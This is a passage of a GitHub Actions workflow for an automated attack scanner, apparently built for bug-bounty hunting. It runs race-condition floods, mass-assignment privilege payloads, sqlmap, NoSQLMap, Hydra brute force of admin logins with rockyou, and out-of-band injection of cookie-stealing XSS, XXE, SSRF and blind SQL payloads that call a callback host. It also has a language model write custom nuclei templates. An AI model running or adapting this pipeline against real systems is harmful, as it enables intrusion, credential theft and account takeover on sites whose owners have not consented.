                  except urllib.error.HTTPError as e: return e.code
                  except: return 0
              with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
                  fs=[ex.submit(sr) for _ in range(25)]
                  for f in concurrent.futures.as_completed(fs): results.append(f.result())
              ok=sum(1 for r in results if r in [200,201,204])
              fail=sum(1 for r in results if r in [409,429,500])
              if ok>1 and fail>1: fnd.append(f"[RACE] {url} | {ok} success / {fail} fail")
          mpayloads=[{"role":"admin","is_admin":True},{"balance":999999999,"verified":True},{"is_superuser":True},{"plan":"enterprise"}]
          for url in eps[:3]:
              for payload in mpayloads:
                  try:
                      req=urllib.request.Request(url,data=json.dumps(payload).encode(),headers={**H,"Content-Type":"application/json"},method="PUT")
                      resp=urllib.request.urlopen(req,timeout=10)
                      if resp.status==200: fnd.append(f"[MASS-ASSIGN] {url} | {list(payload.keys())[0]}={list(payload.values())[0]} | Status {resp.status}")
                  except: pass
          for name,file in [("RACE","race_findings"),("MASS-ASSIGN","mass_assignment_findings")]:
              with open(os.path.join(rd,{"RACE":"race","MASS-ASSIGN":"mass_assignment"}[name],f"{file}.txt"),"w") as f: f.write("\n".join([l for l in fnd if f"[{name}" in l]) if any(f"[{name}" in l for l in fnd) else f"No {name} findings\n")
          print(f"  ✅ Race/Mass: {len(fnd)} findings")
          PYEOF

      - name: "🔬 Phase 6b: Advanced Exploitation (sqlmap, NoSQLMap, Hydra)"
        continue-on-error: true
        timeout-minutes: 25
        run: |
          PATH="/root/go/bin:$HOME/go/bin:/opt/sqlmap:$PATH"
          if [ -d "/opt/sqlmap" ]; then
            grep '\[sqli\]' "$RD/urls/gf_categorized.txt" 2>/dev/null | sed 's/^\[sqli\] //' | head -3 > /tmp/sqli_t.txt
            python3 -c "import json; [print(d['url'].split('?')[0]) for d in json.load(open('$RD/ai_agent/injection_findings.json')) if d.get('vuln_class')=='SQLi'][:3]" >> /tmp/sqli_t.txt 2>/dev/null || true
            sort -u /tmp/sqli_t.txt -o /tmp/sqli_t.txt
            while IFS= read -r url; do
              [ -z "$url" ] && continue
              python3 /opt/sqlmap/sqlmap.py -u "$url" --batch --random-agent --level 3 --risk 2 --time-sec 8 --threads 4 --tamper=space2comment --flush-session --output-dir="$RD/ai_agent/brute/sqlmap_$(echo $url|md5sum|cut -c1-8)" 2>>"$RD/logs/sqlmap.log" >/dev/null 2>&1 || true
            done < /tmp/sqli_t.txt
          fi
          if [ -d "/opt/NoSQLMap" ] && [ -s "$RD/live/live.txt" ]; then
            head -3 "$RD/live/live.txt" | while IFS= read -r host; do
              h="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$h" ] && continue
              timeout 120 python3 /opt/NoSQLMap/nosqlmap.py -t "$h" --batch 2>>"$RD/logs/nosqlmap.log" > "$RD/ai_agent/brute/nosqlmap.txt" 2>&1 || true
            done
          fi
          if command -v hydra &>/dev/null; then
            grep -v '^#' "$RD/js/admin.txt" 2>/dev/null | head -3 | while IFS= read -r line; do
              url=$(echo "$line" | awk '{print $NF}'); [ -z "$url" ] && continue
              HOST=$(echo "$url" | sed 's|https://||;s|http://||;s|/.*||;s|:.*||')
              PATH_INFO=$(echo "$url" | sed 's|https\?://[^/]*||')
              timeout 120 hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz -t 4 -w 10 -f "$HOST" http-post-form "${PATH_INFO:-/login}:username=^USER^&password=^PASS^:Login failed" 2>>"$RD/logs/hydra.log" > "$RD/ai_agent/brute/hydra_admin.txt" 2>&1 || true
            done
          fi

      - name: "📡 Phase 6c: OOB Detection"
        if: ${{ env.OOB_DETECTION == 'true' }}
        continue-on-error: true
        timeout-minutes: 15
        run: |
          python3 << 'PYEOF'
          import json,os,urllib.request,time,concurrent.futures
          rd=os.environ["RD"]; cb="http://messi-"+str(int(time.time()))+"-"+os.environ.get("TARGET","x").split(".")[0]+"."+(os.environ.get("INTERACTSH_URL","oast.fun"))
          fnd=[]
          payloads=[f'<script>fetch("{cb}/x?c="+document.cookie)</script>',f'<img src="{cb}/x.png">',f'http://{cb}/ssrf',f"';utl_http.request('{cb}/sql');--",f'<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM "{cb}/xxe">]><root>&xxe;</root>',f'//{cb}/redir']
          live=open(os.path.join(rd,"live","live.txt")).readlines()[:8] if os.path.exists(os.path.join(rd,"live","live.txt")) else [f"https://{os.environ.get('TARGET','')}"]
          urls=[l.strip().split()[0] for l in live if l.strip()] if live else [f"https://{os.environ.get('TARGET','')}"]
          H={"User-Agent":os.environ.get("UA","Mozilla/5.0")}
          if os.environ.get("AUTH_COOKIE",""): H["Cookie"]=os.environ["AUTH_COOKIE"]
          def inj(url):
              for pl in payloads[:4]:
                  try:
                      if "xxe" in pl:
                          req=urllib.request.Request(url,data=pl.encode(),headers={**H,"Content-Type":"application/xml"},method="POST"); urllib.request.urlopen(req,timeout=8)
                      elif "{" in url: continue
                      else:
                          sep="&" if "?" in url else "?"; tu=f"{url}{sep}q={urllib.parse.quote(pl)}"; req=urllib.request.Request(tu,headers=H); urllib.request.urlopen(req,timeout=8)
                  except: pass
          with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex: ex.map(inj,urls)
          print(f"  ⏳ Waiting 20s for OOB callbacks..."); time.sleep(20)
          try:
              poll=urllib.request.urlopen(f"https://{cb.split('//')[1].split('/')[0]}/poll" if "oast" in cb else f"https://{cb.split('//')[1]}/poll",timeout=10)
              data=json.loads(poll.read())
              for ev in data.get("events",data.get("data",[])):
                  fnd.append(f"[OOB] Callback: {ev.get('type','unknown')} | {ev.get('url','')[:100]}")
              if data.get("events") or data.get("data"): json.dump(data,open(os.path.join(rd,"oob","callbacks.json"),"w"),indent=2)
          except: pass
          with open(os.path.join(rd,"oob","oob_findings.txt"),"w") as f: f.write("\n".join(fnd) if fnd else "No OOB callbacks\n")
          print(f"  ✅ OOB: {len(fnd)} callbacks")
          PYEOF

      - name: "🧬 Phase 6d: AI Custom Nuclei Templates"
        continue-on-error: true
        timeout-minutes: 8
        run: |
          python3 << 'PYEOF'
          import json,os,urllib.request,re,time
          rd=os.environ["RD"]; target=os.environ["TARGET"]
          tech=""
          try: tech=open(os.path.join(rd,"live","tech_detected.txt")).read()[:1500]
          except: pass
          provs=[]
          if os.environ.get("ANTHROPIC_API_KEY",""): provs.append({"u":"https://api.anthropic.com/v1/messages","h":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"b":lambda p:json.dumps({"model":"claude-sonnet-4-20250514","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"x":lambda r:r["content"][0]["text"]})
          if os.environ.get("OPENROUTER_API_KEY",""): provs.append({"u":"https://openrouter.ai/api/v1/chat/completions","h":{"Authorization":"Bearer "+os.environ["OPENROUTER_API_KEY"],"content-type":"application/json"},"b":lambda p:json.dumps({"model":"anthropic/claude-sonnet-4","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"x":lambda r:r["choices"][0]["message"]["content"]})
          if not provs: exit(0)
          prompt=f"Generate 3 YAML nuclei templates for {target} with tech: {tech}. Custom templates for specific versions detected. Return YAML only:\nid: custom-template\ninfo:\n  name: Custom Template\n  severity: high\nrequests:\n  - method: GET\n    path:\n      - \"{{{{BaseURL}}}}\"\n    matchers:\n      - type: word\n        words:\n          - \"vulnerable\""
          for p in provs:
              try: req=urllib.request.Request(p["u"],data=p["b"](prompt),headers=p["h"],method="POST"); r=p["x"](json.loads(urllib.request.urlopen(req,timeout=120).read())); open(os.path.join(rd,"custom_nuclei","custom_templates.yaml"),"w").write(r); print("  ✅ Custom templates generated"); break
              except Exception as e: print(f"  ⚠️ {str(e)[:50]}"); continue

      # ─── PHASE 7: REPORT ───
      - name: "📋 Phase 7: Triage + Report"
        continue-on-error: true
        timeout-minutes: 5
        run: |
          python3 << 'PYEOF'
          import json,os
          rd=os.environ["RD"]
          SEV={"critical":5,"high":4,"medium":3,"low":2,"info":1,"unknown":0}
          confirmed=[]
          if os.path.exists(os.path.join(rd,"nuclei","findings.jsonl")):
              with open(os.path.join(rd,"nuclei","findings.jsonl")) as f:
                  for line in f:
                      try: j=json.loads(line); s=j.get("info",{}).get("severity","unknown").lower(); n=j.get("info",{}).get("name",""); h=j.get("host",j.get("matched-at","")); confirmed.append((SEV.get(s,0),s.upper(),f"Nuclei: {n} @ {h}"))
                      except: pass
          if os.path.exists(os.path.join(rd,"ai_agent","injection_findings.txt")):
              with open(os.path.join(rd,"ai_agent","injection_findings.txt")) as f:
                  for l in f:
                      if l.startswith("[") and "]" in l: cat=l.split("]")[0][1:]; s="high" if cat in["SQLi","SSTI","RCE","Command"] else "medium"; confirmed.append((SEV[s],s.upper(),cat+" | "+l[:150]))
          for fname,cat in [("xxe_findings","XXE"),("graphql_findings","GraphQL"),("idor_findings","IDOR")]:
              fp=os.path.join(rd,"ai_agent",fname+".txt")
              if os.path.exists(fp):
                  with open(fp) as f:
                      for l in f:
                          if l.startswith(f"[{cat})"): confirmed.append((SEV["high"],"HIGH",l[:150]))
          for fp,cat in [(os.path.join(rd,"files","sensitive.txt"),"Sensitive"),(os.path.join(rd,"cors","vulnerable.txt"),"CORS")]:
              if os.path.exists(fp):
                  with open(fp) as f:
                      for l in f: confirmed.append((SEV["high"],"HIGH",cat+" | "+l[:150]))
          confirmed.sort(key=lambda x:-x[0])
          os.makedirs(os.path.join(rd,"triage"),exist_ok=True)
          with open(os.path.join(rd,"triage","triage.md"),"w") as f:
              f.write(f"# 🐐 Leo Messi Scanner\n**{len(confirmed)} confirmed findings**\n\n")
              for rnk,sev,detail in confirmed:
                  badge={"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🟢"}.get(sev,"⚪")
                  f.write(f"- {badge} **[{sev}]** {detail[:250]}\n")
          print(f"  ✅ Triage: {len(confirmed)} findings")
          PYEOF

      - name: "📤 Upload Artifacts"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: results-${{ env.TID }}-${{ env.TARGET }}
          path: ${{ env.RD }}/
          retention-days: 30

      - name: "📣 Discord Notification"
        if: ${{ always() && inputs.discord_notify == true && env.DISCORD_WEBHOOK != '' }}
        continue-on-error: true
        timeout-minutes: 3
        run: |
          RD="${{ env.RD }}"; SUBS=$(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || echo 0); LIVE=$(wc -l < "$RD/live/live.txt" 2>/dev/null || echo 0)
          NUC=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0); INJ=$(grep -cE '^\[(XSS|SQLi|SSTI|LFI|SSRF|Command)' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || echo 0)
          TOTAL=$((NUC + INJ)); COLOR=5814783; TITLE="🐐 Leo Messi ✅ Scan Complete"
          [ "$TOTAL" -gt 0 ] && COLOR=15158332 && TITLE="🐐 Leo Messi 🚨 Vulnerabilities Found"
          jq -n --arg t "${{ env.TARGET }}" --arg title "$TITLE" --arg subs "$SUBS" --arg live "$LIVE" --arg nuc "$NUC" --arg inj "$INJ" --arg url "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" --argjson color "$COLOR" '{username:"🐐 Leo Messi AI",embeds:[{title:($title+": "+$t),color:$color,url:$url,fields:[{name:"🌐 Recon",value:("Subs: "+$subs+" | Live: "+$live),inline:false},{name:"🔍 Findings",value:("Nuclei: "+$nuc+" | Injection: "+$inj+" | Total: "+($nuc|tonumber+$inj|tonumber|tostring)),inline:false}],footer:{text:"Leo Messi Ultimate v4 | ${{ env.HUNTING_MODE }}"}}]}' | curl -s -X POST "${{ env.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true

      - name: "📊 Summary"
        if: always()
        run: |
          echo "╔══════════════════════════════════════════╗"
          echo "║ 🐐 LEO MESSI ULTIMATE v4               ║"
          echo "║ Target: ${{ env.TARGET }}              ║"
          echo "║ Mode:   ${{ env.HUNTING_MODE }}        ║"
          echo "╠══════════════════════════════════════════╣"
          for f in "$RD/subdomains/all_subs.txt" "$RD/live/live.txt" "$RD/urls/all_urls.txt" "$RD/js/secrets.txt" "$RD/nuclei/findings.jsonl" "$RD/cors/vulnerable.txt" "$RD/files/sensitive.txt" "$RD/ai_agent/injection_findings.txt" "$RD/ai_agent/xxe_findings.txt" "$RD/ai_agent/graphql_findings.txt" "$RD/ai_agent/idor_findings.txt" "$RD/race/race_findings.txt" "$RD/mass_assignment/mass_assignment_findings.txt" "$RD/oob/oob_findings.txt"; do
            [ -f "$f" ] && echo "║ ✅ $(basename $(dirname $f))/$(basename $f): $(wc -l < $f)" 2>/dev/null
          done
          echo "╠══════════════════════════════════════════╣"
          echo "║ ✅ Scan complete! Artifacts: 30 days   ║"
          echo "╚══════════════════════════════════════════╝"
